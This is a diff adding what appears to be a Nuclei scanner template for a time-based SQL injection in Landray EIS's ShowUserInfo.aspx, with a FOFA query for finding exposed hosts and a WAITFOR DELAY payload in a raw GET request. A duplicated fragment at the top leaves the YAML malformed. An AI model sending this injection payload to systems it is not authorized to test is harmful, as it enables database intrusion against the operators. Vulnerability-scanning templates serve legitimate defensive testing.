@@ -1,0 +1,28 @@
+如果有延迟语句的话， 必须设置  @timeout: 10s  否则他默认不会等待你延迟完成就直接断开连接， 相当于模版失效了
+http:
+  - raw:
+      - |
+        @timeout: 10s
+
+id: landray_eis_showuserinfo-yanchi_aspx_sqli
+
+info:
+  name: 蓝凌EIS体验系统用户信息  ShowUserInfo.aspx sql 注入 
+  author: beitso
+  severity: high
+  description: 蓝凌EIS体验系统用户信息  ShowUserInfo.aspx页面存在 sql 注入  fofa="/scripts/jquery.landray.common.js"
+  metadata:
+    max-request: 1
+    fofa-query: app="Landray智慧协同平台","/scripts/jquery.landray.common.js"
+    verified: true
+  tags: sqli,OA,landray,hw,landray-eis
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        GET /third/DingTalk/Demo/ShowUserInfo.aspx?account=1%27WAITFOR+DELAY+'0:0:5'--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration >= 5'
